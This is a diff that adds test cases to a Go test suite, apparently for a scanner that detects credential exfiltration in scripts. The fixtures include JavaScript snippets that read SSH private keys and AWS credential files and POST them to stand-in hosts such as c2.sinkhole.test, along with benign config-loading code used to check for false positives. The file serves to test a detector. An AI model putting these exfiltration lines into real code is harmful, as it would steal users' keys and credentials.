@@ -166,6 +166,80 @@ func TestScriptHeuristics(t *testing.T) {
 			wantAt:   map[string]string{"GAL-EXFIL-001": "c.py:2"},
 		},
 		{
+			name:     "twenty far pairs do not hide a near credential pair",
+			setup:    filesRepo(map[string]string{"setup.js": farDecoys() + "const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\nfetch('https://c2.sinkhole.test/k', { method: 'POST', body: key });\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "setup.js:123"},
+		},
+		{
+			name:     "credential path joined over several lines and sent",
+			setup:    filesRepo(map[string]string{"c.js": "const f = fs.readFileSync(path.join(\n  os.homedir(),\n  '.aws',\n  'credentials',\n));\nfetch('https://c2.sinkhole.test/c', { method: 'POST', body: f });\n"}),
+			wantCode: 20,
+			wantAt:   map[string]string{"GAL-EXFIL-001": "c.js:3"},
+		},
+		{
+			name: "benign notebook reads the aws config file and calls an API",
+			setup: filesRepo(map[string]string{"analysis.py": `import os, json
+import requests
+from pathlib import Path
+KAGGLE = Path.home() / '.kaggle' / 'kaggle.json'
+AWS = Path.home() / '.aws' / 'config'
+region = 'us-east-1'
+if AWS.exists():
+    region = AWS.read_text().split('region = ')[-1].strip()
+r = requests.get(f'https://api.test/data?region={region}')
+df = r.json()
+print(len(df))
+`}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
+			wantScoreAtMost: 0,
+		},
+		{
+			name: "benign auth helper reads the netrc file and calls an API",
+			setup: filesRepo(map[string]string{"auth.py": `import netrc, os, requests
+from pathlib import Path
+def auth_for(host):
+    rc = Path.home() / '.netrc'
+    if not rc.exists():
+        return None
+    login, _, password = netrc.netrc(rc).authenticators(host)
+    return (login, password)
+def get(url):
+    return requests.get(url, auth=auth_for('api.test'))
+`}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001", "GAL-EXFIL-002"},
+			wantScoreAtMost: 0,
+		},
+		{
+			name: "benign aws config loader defines where its files live",
+			setup: filesRepo(map[string]string{"index.js": `'use strict';
+const { join } = require('path');
+const { homedir } = require('os');
+const { readFile } = require('fs/promises');
+const http = require('http');
+const getHomeDir = () => process.env.HOME || homedir();
+const getCredentialsFilepath = () => process.env.AWS_SHARED_CREDENTIALS_FILE || join(getHomeDir(), '.aws', 'credentials');
+const getConfigFilepath = () => process.env.AWS_CONFIG_FILE || join(getHomeDir(), '.aws', 'config');
+const loadSharedConfigFiles = async () => ({
+  configFile: await readFile(getConfigFilepath(), 'utf8').catch(() => ''),
+  credentialsFile: await readFile(getCredentialsFilepath(), 'utf8').catch(() => ''),
+});
+// IMDS credential provider
+const httpRequest = (options) => new Promise((resolve, reject) => {
+  const req = http.request({ method: 'GET', ...options, hostname: '169.254.169.254' });
+  req.on('response', (res) => { const chunks = []; res.on('data', (c) => chunks.push(c)); res.on('end', () => resolve(Buffer.concat(chunks))); });
+  req.on('error', reject);
+  req.end();
+});
+module.exports = { loadSharedConfigFiles, httpRequest };
+`}),
+			wantCode:        0,
+			wantAbsent:      []string{"GAL-EXFIL-001"},
+			wantScoreAtMost: 5,
+		},
+		{
 			name:            "benign app joins an env example path and calls an API",
 			setup:           filesRepo(map[string]string{"server.js": "const t = fs.readFileSync(path.join(__dirname, '.env.example'), 'utf8');\nfetch('https://api.example.test').then((r) => r.json());\n"}),
 			wantCode:        0,
@@ -264,4 +338,15 @@ func hasSnippet(rep scriptReport, want string) bool {
 		}
 	}
 	return false
+}
+
+// farDecoys returns 20 credential files that a file reads at its top and
+// sends 120 lines further down.
+func farDecoys() string {
+	var reads, names []string
+	for i := range 20 {
+		names = append(names, fmt.Sprintf("decoy%d", i))
+		reads = append(reads, fmt.Sprintf("const decoy%d = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'));\n", i))
+	}
+	return strings.Join(reads, "") + strings.Repeat("work();\n", 100) + "fetch('https://telemetry.sinkhole.test/ping', { body: [" + strings.Join(names, ", ") + "] });\n"
 }
